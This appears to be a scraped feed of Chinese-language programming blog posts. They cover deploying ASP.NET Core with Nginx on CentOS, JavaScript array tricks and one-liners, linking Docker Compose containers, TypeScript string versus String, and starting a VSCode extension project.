\u0026#34;linux.darkblog.net\u0026#34;, referrer: \u0026#34;http://linux.darkblog.net/\u0026#34; 爬文是 Security-Enhanced Linux (SELinux) 作祟，它是 RHEL 6.6+/CentOS 6.6+ 新加的安全鎖，需下指令解除封印：\n1 sudo setsebool -P httpd_can_network_connect on 接著要設定 SSL： 有個很威的工具叫 Certbot，可以自動申請、驗證、下載、安裝並定期更新 Let\u0026rsquo;s Enrypt 憑證。但這部分要將網站正式掛上 Internet 才好測試，真實憑證留待未來再玩，我先做一張自發憑證驗證 SSL 功能。\n1 2 3 4 sudo mkdir /etc/ssl/private sudo chmod 700 /etc/ssl/private sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048 建立一個 /var/nginx/conf.d/ssl.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 server { listen 443 http2 ssl; listen [::]:443 http2 ssl; server_name linux.darkblog.net; ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt; ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key; ssl_dhparam /etc/ssl/certs/dhparam.pem; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 參考：\nHow To Secure Nginx with Let\u0026rsquo;s Encrypt on CentOS 7 NGINX 使用 Let’s Encrypt 免費 SSL 憑證設定 HTTPS 安全加密網頁教學 - G.T.Wang How To Create a Self-Signed SSL Certificate for Nginx on CentOS 7 NLog.config 路徑配合作業系統要改 \u0026quot;/var/log/Darkblog/$/$.log\u0026quot;\n在 Reverse Proxy 模式下 HttpContext.Connection.RemoteIpAddress 會抓到 ::1，而 HttpContext.Connection.RemotePort 則是 5000，並非真實客戶端 IP 及對外 Port。在 Startup.cs 加入 app.UseForwardedHeaders() 可解決問題，但啟用 UseForwardedHeaders() 若未搭配 Reverse Proxy 會有來源 IP 偽造風險，不想冒險也不想針對 IIS / Nginx 調整設定，我想到一招讓程式自動依 OS 決定要不要啟用，一勞永逸：\n1 2 3 4 5 6 7 8 9 10 11 public void Configure(IApplicationBuilder app, IHostingEnvironment env) { //運行於 Linux 時啟用 Reverse Proxy 模式 if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) { app.UseForwardedHeaders(new ForwardedHeadersOptions { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }); } } 線上主機當然不好每次靠手動輸入 dotnet Blah.dll 啟動網站，ASP.NET Core 文件展示了將程式包成服務的方法。先建立 /etc/systemd/system/kestrel-darkblog.service，內容如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [Unit] Description=Darkblog.Core Server [Service] WorkingDirectory=/var/www/Darkblog ExecStart=/usr/bin/dotnet /var/www/Darkblog/Darkblog.Core.dll Restart=always # Restart service after 10 seconds if the dotnet service crashes: RestartSec=10 SyslogIdentifier=darkblog-core User=www-data Environment=ASPNETCORE_ENVIRONMENT=Production Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false [Install] WantedBy=multi-user.target 設好 kestrel-darkblog.service 後註冊並啟動服務 1 2 3 sudo systemctl enable kestrel-darkblog.service sudo systemctl start kestrel-darkblog.service sudo systemctl status kestrel-darkblog.service 馬上遇到錯誤：\n1 (code=exited, status=217/USER) Process: 66571 ExecStart=/usr/bin/dotnet /var/www/Darkblog/Darkblog.Core.dll (code=exited, status=1/FAILURE) 原因是服務模式使用 www-data 身分執行，沒有權限存取 ASP.NET Core 網站所在目錄與檔案。這部分我不是很確定做法，找到的解法是用 chown 將 /var/www/Darkblog 目錄的擁有者及群組都設成 www-data，建立 www-data 帳號及群組，並將我的管理帳號也加入 www-data 群組，如此服務可以存取該目錄，而我也有權限部署檔案。(註：) 以下指令建立 www-data 使用者及群組，將 jeffrey 加入群組，並授與 www-data 群組可以寫入：\n1 2 3 4 sudo groupadd www-data sudo useradd -g www-data www-data sudo usermod -a -G www-data jeffrey sudo chmod g+w -R /var/www/Darkblog 有一則小訣竅，以服務方式執行 ASP.NET Core 看不到主控台顯示的錯誤訊息，可改用這個指令來查看： 1 sudo journalctl -fu kestrel-darkblog.service 以上，ASP.NET Core + Nginx on CentOS 執行成功。\n附上 CPU / Memory 使用狀況，這是在開瀏覽器狂按 F5 下的數字，總記憶體 1GB，dotnet CPU 在 5% 以下，RAM 耗用不到 10%，有個 kworker CPU 偏高，爬文與硬碟有關，推測與 Win10 Hyper-V VM 不怎麼的虛擬磁碟效能有點關係。但整體數字讓我很滿意，遷都 CentOS 計劃繼續挺進。\n","date":"2022-12-06T00:00:00Z","image":"https://live.staticflickr.com/65535/52564798549_d9c11f4419_o.png","permalink":"https://wayneblog.ga/2022-12-06/dotnet-nginx-install-on-centos/","title":"在 CentOS 上安裝 ASP.NET Core + Nginx 的筆記"},{"content":" 參考網站\n參考網站\n陣列是 JavaScript 中最常用到的概念之一。處理資料時很常用到這種資料結構。這篇文章介紹一些陣列操作的基本方法，希望對你有幫助！\n從陣列中移除重複項目 很經典的面試問題，需要從陣列中找出獨立值。使用 Set 資料型態，可以輕易完成這任務。這邊介紹兩種方法，一個使用 .from() 一個使用 \u0026hellip; 展開運算子。\n1 2 3 4 5 6 7 8 9 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; // First method var uniqueFruits = Array.from(new Set(fruits)); console.log(uniqueFruits); // returns [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;grape\u0026#34;] // Second method var uniqueFruits2 = [...new Set(fruits)]; console.log(uniqueFruits2); // returns [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;grape\u0026#34;] 從陣列中抽換掉某個元素 這個情境也很常見。有一個簡單的好方法，就是使用 .splice ，參數分別是開始修改的位置、修改幾個元素、要更改成哪些值。\n1 2 3 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; fruits.splice(0, 2, \u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;); console.log(fruits); // returns [\u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;] 不用 .map() 的 map 功能 .map() 很常用、大家都會用，但有一個方法也很不錯，也很簡潔，就是 .from()。\n1 2 3 4 5 6 7 8 9 10 11 12 var friends = [ { name: \u0026#34;John\u0026#34;, age: 22 }, { name: \u0026#34;Peter\u0026#34;, age: 23 }, { name: \u0026#34;Mark\u0026#34;, age: 24 }, { name: \u0026#34;Maria\u0026#34;, age: 22 }, { name: \u0026#34;Monica\u0026#34;, age: 21 }, { name: \u0026#34;Martha\u0026#34;, age: 19 }, ] var friendsNames = Array.from(friends, ({name}) =\u0026gt; name); console.log(friendsNames); // returns [\u0026#34;John\u0026#34;, \u0026#34;Peter\u0026#34;, \u0026#34;Mark\u0026#34;, \u0026#34;Maria\u0026#34;, \u0026#34;Monica\u0026#34;, \u0026#34;Martha\u0026#34;] 清空陣列 有時候你會需要清空一個陣列。一個一個把元素刪掉太慢了，下面這個方法快多了：直接把長度設為 0 吧！\n1 2 3 4 5 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; fruits.length = 0; console.log(fruits); // returns [] 把陣列轉換為物件 有時需要把陣列轉成物件。使用 \u0026hellip; 展開運算子可以很快完成這任務。\n1 2 3 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;]; var fruitsObj = { ...fruits }; console.log(fruitsObj); // returns {0: \u0026#34;banana\u0026#34;, 1: \u0026#34;apple\u0026#34;, 2: \u0026#34;orange\u0026#34;, 3: \u0026#34;watermelon\u0026#34;, 4: \u0026#34;apple\u0026#34;, 5: \u0026#34;orange\u0026#34;, 6: \u0026#34;grape\u0026#34;, 7: \u0026#34;apple\u0026#34;} 陣列塞滿資料 有時需要把一個陣列塞滿某些資料。使用 .fill() 可以快速完成這任務：\n1 2 var newArray = new Array(10).fill(\u0026#34;1\u0026#34;); console.log(newArray); // returns [\u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;] 合併陣列 老方法是使用 .concat() 來合併。但有個新方法，就是用 \u0026hellip; 展開運算子，非常簡單俐落：\n1 2 3 4 5 var fruits = [\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;orange\u0026#34;]; var meat = [\u0026#34;poultry\u0026#34;, \u0026#34;beef\u0026#34;, \u0026#34;fish\u0026#34;]; var vegetables = [\u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;cucumber\u0026#34;]; var food = [...fruits, ...meat, ...vegetables]; console.log(food); // [\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;poultry\u0026#34;, \u0026#34;beef\u0026#34;, \u0026#34;fish\u0026#34;, \u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;cucumber\u0026#34;] 找出陣列交集 這也是 JavaScript 面試最常見的問題。這邊使用 filter 跟 .includes() 來完成這任務。\n1 2 3 4 var numOne = [0, 2, 4, 6, 8, 8]; var numTwo = [1, 2, 3, 4, 5, 6]; var duplicatedValues = [...new Set(numOne)].filter(item =\u0026gt; numTwo.includes(item)); console.log(duplicatedValues); // returns [2, 4, 6] 把 false 相關的值從陣列移除 false 相關值包含 false、0、\u0026quot;\u0026quot;、null、NaN、undefined。\n使用 .filter() 可以俐落地過濾陣列。\n1 2 3 var mixedArr = [0, \u0026#34;blue\u0026#34;, \u0026#34;\u0026#34;, NaN, 9, true, undefined, \u0026#34;white\u0026#34;, false]; var trueArr = mixedArr.filter(Boolean); console.log(trueArr); // returns [\u0026#34;blue\u0026#34;, 9, true, \u0026#34;white\u0026#34;] 從陣列撈出隨機元素 有時需要隨機撈元素出來。根據陣列長度，隨機撈一個索引出來，就可以囉。\n1 2 var colors = [\u0026#34;blue\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;brown\u0026#34;]; var randomColor = colors[(Math.floor(Math.random() * (colors.length)))] 逆轉陣列 不需要複雜的迴圈跟函數，也能逆轉一個陣列。這樣一行就可以：\n1 2 3 var colors = [\u0026#34;blue\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;brown\u0026#34;]; var reversedColors = colors.reverse(); console.log(reversedColors); // returns [\u0026#34;brown\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;blue\u0026#34;] .lastIndexOf() 方法 這個有趣的方法，可以找到特定元素最後一次出現的索引。如果陣列中有重複值，就可用上這方法。\n1 2 3 var nums = [1, 5, 2, 6, 3, 5, 2, 3, 6, 5, 2, 7]; var lastIndex = nums.lastIndexOf(5); console.log(lastIndex); // returns 9 陣列中全部數值加總 這也是面試常見考題。使用 .reduce 可以快速解決這問題。\n1 2 3 var nums = [1, 5, 2, 6]; var sum = nums.reduce((x, y) =\u0026gt; x + y); console.log(sum); // returns 14 ","date":"2022-12-05T00:00:00Z","image":"https://live.staticflickr.com/65535/52544052174_68e62fb7f8_o.png","permalink":"https://wayneblog.ga/2022-12-05/js-13-useful-array-tricks/","title":"JavaScript 中關於 Array 的 13 個入門小技巧！"},{"content":" 參考網站\n參考網站\n一行程式碼有時可以做到很多事。這邊有七個小任務都用一行就可以完成，給您參考！\n洗亂陣列 在需要將陣列隨機打亂的時候，這行會很好用。\n1 2 3 4 5 const shuffleArray = (arr) =\u0026gt; arr.sort(() =\u0026gt; Math.random() - 0.5); // Testing const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; console.log(shuffleArray(arr)); 複製到剪貼板 在寫網站功能的時候，有時會需要這個功能。\n1 2 3 4 5 const copyToClipboard = (text) =\u0026gt; navigator.clipboard?.writeText \u0026amp;\u0026amp; navigator.clipboard.writeText(text); // Testing copyToClipboard(\u0026#34;Hello World!\u0026#34;); 不重複元素 每種語言都有實作自己的 Hash List，在 JavaScript 中，叫做 Set。可以使用 Set Data Structure 輕鬆地找出不重複元素。\n1 2 3 4 5 const getUnique = (arr) =\u0026gt; [...new Set(arr)]; // Testing const arr = [1, 1, 2, 3, 3, 4, 4, 4, 5, 5]; console.log(getUnique(arr)); 檢測深色模式 深色模式日益流行，如果用戶在他們的設備中啟用了深色模式，最好將您的應用程序也切換到深色模式。\n1 2 3 4 5 6 const isDarkMode = () =\u0026gt; window.matchMedia \u0026amp;\u0026amp; window.matchMedia(\u0026#34;(prefers-color-scheme: dark)\u0026#34;).matches; // Testing console.log(isDarkMode()); 滑到頂部 新手常常發現滑動元素很難做。最簡單的方法是使用 scrollIntoView。\n加上 behavior 可以讓動畫更流暢。\n1 2 const scrollToTop = (element) =\u0026gt; element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }); 滑到底部 一樣使用 scrollIntoView 就可以，只需要將 block 值改成 end。\n1 2 const scrollToBottom = (element) =\u0026gt; element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }); 產生隨機顏色 如果您需要隨機色碼，可以參考這段：\n1 2 const generateRandomHexColor = () =\u0026gt; `#${Math.floor(Math.random() * 0xffffff).toString(16)}`; ","date":"2022-12-05T00:00:00Z","image":"https://live.staticflickr.com/65535/52544218553_b60d2ccdec_o.jpg","permalink":"https://wayneblog.ga/2022-12-05/js-7-killer-one-liners/","title":"一行 JavaScript 就能完成的 7 個小任務！"},{"content":" 參考網站\n在 Docker 中，容器之間的鏈接是一種很常見的操作，它提供了訪問其中的某個容器的網絡服務而不需要將所需的端口暴露給 Docker Host 主機的功能。Docker Compose 中對該特性的支持同樣是很方便的。然而，如果需要鏈接的容器沒有定義在同一個 docker-compose.yml 中的時候，這個時候就稍微麻煩複雜了點。\n不使用 Docker Compose 在不使用Docker Compose的時候，將兩個容器鏈接起來使用—link參數，相對來說比較簡單，以nginx鏡像為例子：\n1 2 docker run --rm --name test1 -d nginx # 開啟一個實例test1 docker run --rm --name test2 --link test1 -d nginx # 開啟一個實例test2並與test1建立鏈接 這樣，test2 與 test1 便建立了鏈接，就可以在 test2 中使用訪問 test1 中的服務了。\n使用Docker Compose 如果使用 Docker Compose，那麼這個事情就更簡單了，還是以上面的 nginx 鏡像為例子，編輯 docker-compose.yml 文件為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 version: \u0026#34;3\u0026#34; services: test2: image: nginx depends_on: - test1 links: - test1 test1: image: nginx 最終效果與使用普通的 Docker 命令 docker run xxxx 建立的鏈接並無區別。這只是一種最為理想的情況。\n問題 如果容器沒有定義在同一個 docker-compose.yml 文件中，應該如何鏈接它們呢？ 如果定義在 docker-compose.yml 文件中的容器需要與 docker run xxx 啟動的容器鏈接，需要如何處理？ 方法一：讓需要鏈接的容器同屬一個外部網絡 我們還是使用 nginx 鏡像來模擬這樣的一個情景：假設我們需要將兩個使用 Docker Compose 管理的 nignx 容器(test1和test2)鏈接起來，使得 test2 能夠訪問 test1 中提供的服務，這裡我們以能 ping 通為準。\n首先，我們定義容器 test1 的 docker-compose.yml 文件內容為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 version: \u0026#34;3\u0026#34; services: test2: image: nginx container_name: test1 networks: - default - app_net networks: app_net: external: true 容器 test2 內容與 test1 基本一樣，只是多了一個 external_links。\n需要特別說明的是：最近發布的 Docker 版本已經不需要使用 external_links 來鏈接容器，容器的 DNS 服務可以正確的作出判斷，因此如果你你需要兼容較老版本的 Docker 的話，那麼容器 test2 的 docker-compose.yml 文件內容為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 version: \u0026#34;3\u0026#34; services: test2: image: nginx networks: - default - app_net external_links: - test1 container_name: test2 networks: app_net: external: true 否則的話，test2 的 docker-compose.yml 和 test1 的定義完全一致，不需要額外多指定一個 external_links。相關的問題請參見 stackoverflow 上的相關問題：docker-compose + external container\n正如你看到的那樣，這裡兩個容器的定義裡都使用了同一個外部網絡 app_net，因此，我們需要在啟動這兩個容器之前通過以下命令再創建外部網絡：\n1 docker network create app_net 之後，通過 docker-compose up -d 命令啟動這兩個容器，然後執行 docker exec -it test2 ping test1，你將會看到如下的輸出：\n1 2 3 4 5 6 7 8 $ docker exec -it test2 ping test1 PING test1 (172.18.0.2): 56 data bytes 64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.091 ms 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.146 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.150 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.145 ms 64 bytes from 172.18.0.2: icmp_seq=4 ttl=64 time=0.126 ms 64 bytes from 172.18.0.2: icmp_seq=5 ttl=64 time=0.147 ms 證明這兩個容器是成功鏈接了，反過來在 test1 中 ping test2 也是能夠正常 ping 通的。\n如果我們通過 docker run --rm --name test3 -d nginx 這種方式來先啟動了一個容器(test3)，並且沒有指定它所屬的外部網絡，而需要將其與 test1 或者 test2 鏈接的話，這個時候手動鏈接外部網絡即可：\n1 docker network connect app_net test3 這樣，三個容器都可以相互訪問了。\n方法二：更改需要鏈接的容器的網絡模式 通過更改你想要相互鏈接的容器的網絡模式為 bridge，並指定需要鏈接的外部容器(external_links)即可。\n與同屬外部網絡的容器可以相互訪問的鏈接方式一不同，這種方式的訪問是單向的。\n還是以 nginx 容器鏡像為例子，如果容器實例 nginx1 需要訪問容器實例 nginx2，那麼 nginx2 的 docker-compose.yml 定義為：\ndocker-compose.yml 1 2 3 4 5 6 version: \u0026#34;3\u0026#34; services: nginx2: image: nginx container_name: nginx2 network_mode: bridge 與其對應的，nginx1 的 docker-compose.yml 定義為：\ndocker-compose.yml 1 2 3 4 5 6 7 8 version: \u0026#34;3\u0026#34; services: nginx1: image: nginx external_links: - nginx2 container_name: nginx1 network_mode: bridge 需要特別說明的是，這裡的 external_links 是不能省略的，而且 nginx1 的啟動必須要在 nginx2 之後，否則可能會報找不到容器 nginx2 的錯誤。\n接著我們使用 ping 來測試下連通性：\n1 2 3 4 5 6 7 8 $ docker exec -it nginx1 ping nginx2 # nginx1 to nginx2 PING nginx2 (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.141 ms 64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.139 ms 64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 time=0.145 ms $ docker exec -it nginx2 ping nginx1 #nginx2 to nginx1 ping: unknown host 以上也能充分證明這種方式是屬於單向聯通的。\n在實際應用中根據自己的需要靈活的選擇這兩種鏈接方式，如果想偷懶的話，大可選擇第二種。不過我更推薦第一種，不難看出無論是聯通性還是靈活性，較為更改網絡模式的第二種都更為友好。\n","date":"2022-12-04T00:00:00Z","image":"https://live.staticflickr.com/65535/52565233288_251b1a5202_o.jpg","permalink":"https://wayneblog.ga/2022-12-04/docker-compose-link-external-comtainer/","title":"Docker Compose 鏈接外部容器的幾種方式"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n背景 與 JavaScript 語言不同的是，TypeScript 使用的是靜態型別(強型別)，比如說它指定了變數可以儲存的資料型別。\n如下圖所示，如果在 JS 中，指定變數可以儲存的資料型別，會報錯：“型別註釋只可以在TS檔案中被使用”：\nTypeScript 是 JavaScript 的超集(superset)，TypeScript 需要編譯(語法轉換)生成 JavaScript 才能被瀏覽器執行，它也區分了 string 和 String 這兩個資料型別。通常來說，string 表示原生型別，而 String 表示物件。\n原生 string JavaScript 在 ES6 標準裡支援6種原生型別，string 是其中之一。\n1 2 3 4 5 6 let testVar1: number = 19; let testVar2: boolean = true; let testVar3: string =\u0026#34;Hi Wayne!\u0026#34;; let testVar4: null = null; let testVar5: undefined = undefined; let testVar6: object = new String(\u0026#34;Wayne Cloud!\u0026#34;); 原生的 string 是不包含屬性的值(即沒有properties)，包括字面上沒有定義型別、字面上定義了 string、字面上定義了 String和一些從 string 函式呼叫返回的 strings 也都可以被歸為原生型別：\n1 2 3 let msg1: string = \u0026#34;Hello world!\u0026#34;; let msg2: string = \u0026#34;Hello world!\u0026#34;; let msg22 = returnStr(); 以上三個變數的型別(typeof())是 string。\n物件 String 物件是不同屬性的累積，一個物件可以呼叫許多相應的方法。\n1 let msg3: String = new String(\u0026#39;Hello world!\u0026#39;); 這個變數 msg3 的型別就是 object：\n1 console.log(typeof(msg3)); // object String 物件支援的方法：\nNo. Method Description 1. charAt() charAt() 方法從一個字符串中返回指定的字符 2. charCodeAt() charCodeAt() 方法返回 0 到 65535 之間的整數，表示給定索引處的 UTF-16 代碼單元 3. concat() concat() 方法將一個或多個字符串與原字符串連接合併，形成一個新的字符串並返回 4. indexOf() indexOf() 方法，給定一個參數：要搜索的子字符串，搜索整個調用字符串，並返回指定子字符串第一次出現的索引。給定第二個參數：一個數字，該方法將返回指定子字符串在大於或等於指定數字的索引處的第一次出現 5. lastIndexOf() lastIndexOf() 方法返回調用 String 對象的指定值最後一次出現的索引，在一個字符串中的指定位置 fromIndex 處從後向前搜索。如果沒找到這個特定值則返回 -1。該方法將從尾到頭地檢索字符串 str，看它是否含有子串 searchValue。開始檢索的位置在字符串的 fromIndex 處或字符串的結尾(沒有指定 fromIndex 時)。如果找到一個 searchValue，則返回 searchValue 的第一個字符在 str 中的位置。 str 中的字符位置是從 0 開始的 6. localeCompare() localeCompare() 方法返回一個數字來指示一個參考字符串是否在排序順序前面或之後或與給定字符串相同。新的 locales 和 options 參數能讓應用程序定制函數的行為，即指定用來排序的語言。 locales 和 options 參數完全取決於實現，在舊的實現中忽略這兩個參數 7. match() match() 方法檢索返回一個字符串匹配正則表達式的結果 8. replace() replace() 方法返回一個由替換值(replacement)替換部分或所有的模式(pattern)匹配項後的新字符串。模式可以是一個字符串或者一個正則表達式，替換值可以是一個字符串或者一個每次匹配都要調用的回調函數。如果 pattern 是字符串，則僅替換第一個匹配項 9. search() search() 方法執行正則表達式和 String 對象之間的一個搜索匹配 10. slice() slice() 方法提取某個字符串的一部分，並返回一個新的字符串，且不會改動原字符串 11. split() split() 方法使用指定的分隔符字符串將一個 String 對象分割成子字符串數組，以一個指定的分割字串來決定每個拆分的位置 12. substr() substr() 方法返回一個字符串中從指定位置開始到指定字符數的字符 13. substring() substring() 方法返回一個字符串在開始索引到結束索引之間的一個子集，或從開始索引直到字符串的末尾的一個子集 14. toLocaleLowerCase() toLocaleLowerCase() 方法根據任何指定區域語言環境設置的大小寫映射，返回調用字符串被轉換為小寫的格式 15. toLocaleUpperCase() toLocaleUpperCase() 方法根據本地主機語言環境把字符串轉換為大寫格式，並返迴轉換後的字符串 16. toLowerCase() toLowerCase() 會將調用該方法的字符串值轉為小寫形式，並返回 17. toString() 字符串對象的 toString() 方法返回一個字符串，表示指定的字符串 18. toUpperCase() toUpperCase() 方法將調用該方法的字符串轉為大寫形式並返回(如果調用該方法的值不是字符串類型會被強制轉換) 19. valueOf() valueOf() 方法返回 String 對象的原始值 程式碼對比 我們對下面4個變數進行型別的探索與比較：\n1 2 3 4 5 6 7 8 9 10 11 12 let msg: string = \u0026#39;Hello world!\u0026#39;; let msg2: String = \u0026#39;Hello world!\u0026#39;; let msg22 = \u0026#39;Hello world!\u0026#39;; // 字面上沒有定義型別 let msg3: String = new String(\u0026#39;Hello world!\u0026#39;); console.log(typeof(msg)); // string console.log(typeof(msg2)); // string console.log(typeof(msg22)); // string console.log(typeof(msg3)); // object console.log(msg === msg2); // true console.log(msg === msg3); // false console.log(msg2 === msg3); // false 為什麼需要 String 物件 首先，當我們使用關鍵字 new 新建一個 String 物件的時候，Typescript 會建立一個新的物件；\n即我們用 new 新建了兩個 String 物件，即使內容相同，它們也是指向不同的記憶體。\n舉下面兩個例子：\n當用 a1、b1 代表相同值的兩個變數的時候，它們是相同的；而當用 new 新建兩個物件的時候，即使值相同，它們也是不同的： 1 2 3 4 5 6 7 let a1 = \u0026#34;Hello World\u0026#34;; let b2 = \u0026#34;Hello World\u0026#34;; console.log(a1 === b1); // true let a2 = new String(\u0026#34;Hello World\u0026#34;); let b2 = new String(\u0026#34;Hello World\u0026#34;); console.log(a2 === b2); // false eval() 函式的作用：用來計算表示式的值。如果我們把 eval() 直接賦給 string，而 string 裡面是計算式的字串，那麼它會返回計算後的值；而如果我們把 eval() 賦給 String，因為它不是原生型別，它只會返回 String 這個物件： 1 2 3 4 5 6 let a3 = \u0026#34;3 * 9\u0026#34;; console.log(eval(a3)); // 27 let b3 = new String(\u0026#34;8 + 20\u0026#34;); console.log(eval(b3)); // Warning：Argument of type \u0026#39;String\u0026#39; is not assignable to parameter of type \u0026#39;string\u0026#39;. \u0026#39;string\u0026#39; is a primitive, but \u0026#39;String\u0026#39; is a wrapper object. Prefer using \u0026#39;string\u0026#39; when possible.ts(2345) console.log(eval(b3.toSTring())); // 28 其次，因為 String 物件可以有屬性。我們可以用 String 物件在屬性裡保留一個額外的值。即使這個用法並不常見，但是仍然是 TS 的一個特性： 1 2 3 4 5 6 let prim = \u0026#39;hello Wayne\u0026#39;; let obj = new String(\u0026#39;hello Wayne Cloud\u0026#39;); prim.property = \u0026#39;PaaS\u0026#39;; // Invalid obj.property = \u0026#39;PaaS\u0026#39;; // Valid console.log(obj.property); // 輸出為 PaaS 兩者區別總結 string 原生型別 String 物件 廣泛被使用 幾乎很少被使用 只會保留值 有能力除了值之外，還可以保留屬性 值是不可變的，因此執行緒安全 String物件是可變的 沒有任何方法 String物件有各種方法 不能建立兩個獨立的字面上值相同的 string 可以用 new 建立兩個物件 是原生的資料型別 包裝原生資料型別來建立一個物件 傳遞的值是原生資料本身的拷貝 傳遞的值是實際資料的引用 當使用 eval() 函式時，將直接作為原始碼進行處理 當使用 eval() 函式時，將被轉換為字串 ","date":"2022-11-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52549840532_0ea4bef6e7_o.png","permalink":"https://wayneblog.ga/2022-11-28/ts-string-type-vs-class/","title":"TypeScript 裡 string 和 String，還真不僅僅是大小寫的區別！"},{"content":" 參考網站\n參考網站\n參考網站\n前言 VScode 使用者一定會安裝各種 Extension 來建立一個適合自己的開發環境，而這些強大的 Extension 大部分都由世界各地的愛用者開發並發布(publish) ，一切都是為了要讓 VSCode 更加實用上手甚至美觀。\n這篇就是要分享如何建立並發佈一個 Extension，英文程度不錯的建議直接閱讀官方文件，會有更加詳細的解說\n開發環境配置 在開始前，請照下方指示正確設置自己的環境。\n確認已安裝 nodejs 與 npm 1 node -v \u0026amp;\u0026amp; npm -v 如未安裝兩者，請先至 Nodejs 官方網站 下載。npm 會隨著 nodejs 下載一併被安裝，有時候您可能使用過舊的 npm，這時您可以使用以下指令更新它到最新版。\n1 npm install -g npm@latest 如果正確安裝了以上兩者，會跳出兩行版本號資訊。\nexport： 1 2 v16.15.0 8.15.1 安裝 yoman Yoman 是一款流行已久的code generator，可以允許我們使用yoman設置專案的樣板， 並讓我們使用 yo 指令快速產生樣板專案。\nVSCode 官方已經發布了 VSCode Yoman 專案，並且定期更新，因此我們可以直接使用 yo 指令產生 VSCode Extension，無需手動開發 yoman 樣板。\n請使用以下指令安裝yoman與VSCode Extension Generator：\n1 npm install -g yo generator-code 安裝 yoman 後，再次使用版本號指令確認有無正確安裝：\n1 yo --version 使用 yo 快速產生第一個 Extension 專案 首先，於 terminal 進入一個要放置專案的資料夾後，使用指令：\n1 yo code generator 會跳出提示，讓我們選擇要產生的 extension 種類：\n這些 Extension 選項的描述與說明如下：\nExtension 選項 描述 New 